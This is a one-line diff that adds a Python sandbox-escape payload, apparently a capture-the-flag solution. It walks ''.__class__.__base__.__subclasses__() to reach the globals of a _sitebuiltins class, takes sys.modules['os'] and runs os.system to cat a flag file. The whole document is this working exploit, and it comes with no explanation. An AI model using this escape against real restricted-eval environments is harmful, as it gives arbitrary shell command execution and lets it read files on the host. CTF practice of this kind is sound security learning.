@@ -1,0 +1,1 @@
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("cat flag-398bd416-c266-4e0b-9203-e636946098af.txt")
